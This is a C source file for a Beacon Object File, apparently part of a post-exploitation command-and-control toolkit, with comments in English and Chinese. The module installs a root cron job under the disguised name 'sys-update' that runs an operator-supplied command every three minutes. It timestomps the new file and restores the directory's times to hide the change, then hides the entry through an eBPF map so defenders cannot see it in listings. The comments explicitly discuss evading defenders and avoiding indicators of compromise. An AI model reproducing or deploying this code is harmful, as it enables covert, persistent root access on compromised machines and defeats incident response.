/// cron_persist.c — BOF: install a cron.d persistence job with timestomp
/// Compile: gcc -c -o cron_persist.o cron_persist.c -include bof_api.h -Os -fPIC
/// Usage: execute bof cron_persist.o <command> [job_name]
///
/// Writes /etc/cron.d/<job_name> (default "sys-update"), chmod 0600, then
/// aligns the new file's atime/mtime to the /etc/cron.d directory mtime so
/// directory listings don't show a freshly created entry.

#include "bof_api.h"

#define O_WRONLY   01
#define O_CREAT    0100
#define O_TRUNC    01000

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int cmd_len = 0;
    char *cmd = BeaconDataExtract(&parser, &cmd_len);
    int name_len = 0;
    char *name = BeaconDataExtract(&parser, &name_len);
    if (!cmd || cmd_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] cron_persist: missing command argument\n");
        return;
    }
    if (!name || name_len <= 0) { name = "sys-update"; name_len = 10; }

    /* name 指向参数 blob，**不保证 NUL 终止**（最后一个字段处直接结束）—— 直接喂
     * 给 %s 会一路读进相邻内存。先拷进有终止的本地缓冲，后续统一用它。 */
    char jobname[128];
    int jl = name_len > (int)sizeof(jobname) - 1 ? (int)sizeof(jobname) - 1 : name_len;
    AxMemcpy(jobname, name, jl);
    jobname[jl] = 0;

    /* cmd 同样来自参数 blob（同样不保证 NUL），而它比 name 更要紧：要经 %s 落进
     * /etc/cron.d 文件。垃圾尾巴是**同一 msgpack 缓冲区里的下一个键**，很可能
     * 夹带换行 —— 那等于往 cron 文件里注入额外行，落盘即 IOC。见 bof_api.h ISS-073。 */
    char cmdbuf[512];
    if (cmd_len >= (int)sizeof(cmdbuf)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] cron_persist: command too long (%d)\n", cmd_len);
        return;
    }
    AxCStr(cmdbuf, sizeof(cmdbuf), cmd, cmd_len);

    char path[160];
    AxSnprintf(path, sizeof(path), "/etc/cron.d/%s", jobname);

    char content[1024];
    int n = AxSnprintf(content, sizeof(content),
                       "SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
                       "*/3 * * * * root %s\n", cmdbuf);
    if (n <= 0 || n >= (int)sizeof(content)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] cron_persist: command too long\n");
        return;
    }

    /* Timestomp 基准必须在**创建文件之前**取：创建动作本身会把目录 mtime 置为
     * now，之后再读就只能读到 now（等于没做），而且白白留下"这个目录刚被
     * 动过"的痕迹。取到原值后，既用它给新文件定时间，也用它把目录恢复原状。 */
    long as = 0, ans = 0, ms = 0, mns = 0;
    int have_dir_times = (AxFileTimes("/etc/cron.d", &as, &ans, &ms, &mns) == 0);

    int fd = AxOpenFile(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] cron_persist: cannot open %s\n", path);
        return;
    }
    if (AxWriteFile(fd, content, n) != n) {
        AxCloseFile(fd);
        BeaconPrintf(CALLBACK_ERROR, "[-] cron_persist: write failed\n");
        return;
    }
    AxCloseFile(fd);

    AxChmod(path, 0600);

    // Timestomp: new file inherits the directory's *original* mtime, then the
    // directory itself is restored (creating the file bumped it to now).
    if (have_dir_times) {
        AxUtimensat(-100, path, as, ans, ms, mns);
        AxUtimensat(-100, "/etc/cron.d", as, ans, ms, mns);
    }

    /* G7 闭环：/etc/cron.d/<job> 也是加载 eBPF **之后**才出现的，ebpf_load 的
     * <names> 管不到 —— 对手一条 `ls /etc/cron.d` 就看见复活层。自动补写 hide_names；
     * key 是**纯 dirent 名**（jobname）不是路径。隐藏失败不改控制流。 */
    int hr = AxHideNameAdd((const char *)0, jobname);
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] cron_persist: installed %s (every 3 min)\n"
                 "    hide: %s -> %s\n",
                 path, jobname, hr == 0 ? "ok" : (hr == -2 ? "no-map" : "fail"));
    if (hr < 0)
        BeaconPrintf(CALLBACK_OUTPUT,
                     "    [*] 未自动登记（eBPF 未加载 / pin 未知 / map 满）—— "
                     "对手 `ls /etc/cron.d` 能看见。手工补：\n"
                     "        execute bof hide_add.o <pin> %s\n", jobname);
}
